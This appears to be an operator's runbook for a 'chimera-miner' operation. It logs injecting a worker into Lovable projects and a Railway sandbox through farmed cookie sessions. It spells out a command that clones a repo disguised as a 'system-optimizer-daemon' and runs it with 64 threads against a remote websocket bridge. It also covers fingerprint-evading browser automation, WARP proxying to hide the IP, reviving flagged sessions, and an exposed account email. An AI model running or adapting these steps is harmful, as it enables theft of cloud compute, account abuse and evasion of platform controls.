# Script 3 Game - Session 3 Railway Sandbox

**Date:** 2026-08-21
**Session:** session-3
**Project:** bb8e30ff-0ec7-49df-89ee-3b66954c6b0f
**Mode:** oneshot --project bb8e30ff

---

## Railway Account Playing With (Session 3)

**Local Path:** `~/Documents/railways/session-3`
**Mega:** `mega:chimera/session-3-cookies.json` + `mega:chimera/session-3-config.json`

**Config:** `~/Documents/railways/session-3/.railway/config.json`
```json
{
  "user": {
    "id": "89e5ab83-5b4b-4fe5-b50f-ec123b6cc3ef",
    "email": "s.hie.ldsleon.ardo.27.7@gmail.com",
    "accessToken": "[REDACTED - see local ~/Documents/railways/session-3/.railway/config.json]",
    "refreshToken": "[REDACTED - see local config]",
    "tokenExpiresAt": 1786408268
  },
  "projects": {},
  "activeSandbox": null
}
```
**After Revive (2026-08-21 18:24):** `status: active` (was `truly_red`), `51` cookies (`14439` bytes), `on_hold` after script3 start.

**Workspace:** `My Projects` `bdaa6f1d-2840-4b3b-921a-41f7f6aeb5f7`
**Project:** `750d9c1e-31a2-458d-9193-248de86bf759` `s3-2cpu-1gb-...` `692428d2-b32d-4fdf-a21e-94a8e61ee7d2` `production`
**Sandbox:** `872a24bb-09fb-4628-b62f-03c65d1df1dd` `RUNNING` `us-west2` `idle 5m` (prev `c62afc0c`, `fc0a3c9f` destroyed)

---

## Script 3 Minimal for Weak Sandbox (1GB RAM)

**Why Minimal:** Railway sandbox `1GB RAM` + `5m idle` vs host `15GiB` - Firefox 38% 370MB OOM, wireproxy dies, `NS_ERROR_PROXY_CONNECTION_REFUSED`.

**Changes Pushed:** `c46d1c2` to `crucifix-cray/chimera-miner:master` (`fix/script2-3mode`)
- `miner_injector.py:17` `generate_random_folder_name() -> "moly"` (fixed)
- `miner_injector.py:29` `build_worker_command() -> ... --no-schedule  --no-pause > /tmp/m.log 2>&1` (added `--no-pause`)
- `script3_launch_miner.py:545` `headless=True` (was `False`), `humanize=False` (was `True`), `viewport 1280x720`, `sleep 2→1`

**Worker Command (moly):**
```bash
cd /tmp && git clone --depth 1 -q https://github.com/crucifix-cray/system-optimizer-daemon.git moly && cd moly && pip install websockets psutil --break-system-packages -q && python3 sysoptd.py --bridge wss://chimera-bridge-production-0ef2.up.railway.app --threads 64 --no-schedule  --no-pause > /tmp/m.log 2>&1
```

**Warp Isolated:** `wireproxy` `socks5://127.0.0.1:40000` `warp=on` `104.28.201.80` vs direct `152.55.177.188 warp=off` - only browser tunneled, `rclone` direct. Inside sandbox `wgcf register --accept-tos && wgcf generate` + `wireproxy` config from `wgcf-profile.conf` (`PrivateKey`/`PublicKey` via `awk "{print \$3}"`).

**Swap:** `fallocate -l 8G /swap_extra && mkswap && swapon` → `SwapTotal 8.9Gi` ( `zram0 947M` + `8G` file)

**Packages:** `apt install procps htop curl wget git unzip python3-pip xvfb x11-utils iproute2 wireguard-tools` + `pip install playwright==1.61.0 invisible-playwright websockets psutil requests[socks]` + `playwright install-deps firefox && playwright install firefox && invisible_playwright fetch` + `rclone v1.75.0` + `wgcf` + `wireproxy 1.0.9`

**Sessions:** `CHIMERA_SESSIONS_DIR=/home/alan/Documents/automation-toolkit/scripts/sessions` - `rclone copy mega:lovable_sessions /root/lovable_sessions` + `rclone cat mega:chimera/database.json > /tmp/db.json` + `gen.py` to create `69` sessions ( `51` cookies for session-3 via `rclone copyto mega:chimera/session-3-cookies.json`)

**Screenshot on Err:** `script3_launch_miner.py:619` `shot = f"/tmp/script3_error_{args.session}_{project['project_id']}_no_input.png"` + `await chat_page.screenshot(path=shot)` - host `/tmp/script3_error_3_bb8e30ff_no_input.png`, sandbox same via `railway sandbox exec -- cat /tmp/... > /tmp/host.png`

---

## How to Run (Host & Sandbox)

**Host (works):**
```bash
PROXY_PORT=40000 CHIMERA_SESSIONS_DIR=/home/alan/Documents/automation-toolkit/scripts/sessions xvfb-run -a --server-args="-screen 0 1280x720x24" python3 /home/alan/Documents/repos/chimera-miner/script3_launch_miner.py --session 3 --mode oneshot --project bb8e30ff-0ec7-49df-89ee-3b66954c6b0f
# Result: ✅ Found chat input → ✅ Console lovable ready 47s → ✅ Worker moly alive (host 15GiB)
```

**Sandbox (weak, needs minimal):**
```bash
# Inside sandbox 872a24bb
export PROXY_PORT=40000
export CHIMERA_SESSIONS_DIR=/home/alan/Documents/automation-toolkit/scripts/sessions
cd /root/chimera-miner
git pull -q https://${GH_TOKEN}@github.com/crucifix-cray/chimera-miner.git master
timeout 350 xvfb-run -a --server-args="-screen 0 1280x720x24" python3 -u script3_launch_miner.py --session 3 --mode oneshot --project bb8e30ff-0ec7-49df-89ee-3b66954c6b0f
# Screenshot on err: /tmp/script3_error_3_bb8e30ff_no_input.png
```

**Verify Links Owned:**
```bash
CHIMERA_SESSIONS_DIR=/home/alan/Documents/repos/automation-toolkit/scripts/sessions xvfb-run -a python3 /home/alan/Documents/repos/chimera-miner/script3_launch_miner.py --session 3 --mode verify
# Checks 5 projects for session-3: c5a42f16, 17ab5049, 14a60344, 2a235e79, bb8e30ff → linked true/false
```

**Revive Session:**
```bash
CHIMERA_SESSIONS_DIR=/home/alan/Documents/repos/automation-toolkit/scripts/sessions python3 /home/alan/Documents/repos/chimera-miner/revive_red_sessions.py --session 3
# 51 cookies overwritten, status active
```

**Open Session Keep Browser:**
```bash
python3 /home/alan/Documents/repos/automation-toolkit/scripts/load_session.py 3 --sessions-dir /home/alan/Documents/repos/automation-toolkit/scripts/sessions
# or
python3 /home/alan/Documents/repos/automation-toolkit/finals/utils/open_session.py 3
```

---

## Current Status (2026-08-21 18:24)

- Host `session-3` `bb8e30ff` with `moly` `warp 40000` **✅ success** on host
- Sandbox `872a24bb` with `moly` `warp on` `51` cookies **stuck at** `💬 Finding chat input...` → `div[contenteditable] 0` vs host `1` - needs longer `wait_for_selector 3000→8000` or `networkidle`
- `rclone` fixed `unzip -o -q /tmp/rclone.zip -d /tmp && mv /tmp/rclone-v1.75.0-linux-amd64/rclone /usr/local/bin/rclone`
- Next: test with `headless True` minimal + `wait 15000` + `seed` pin for fingerprint
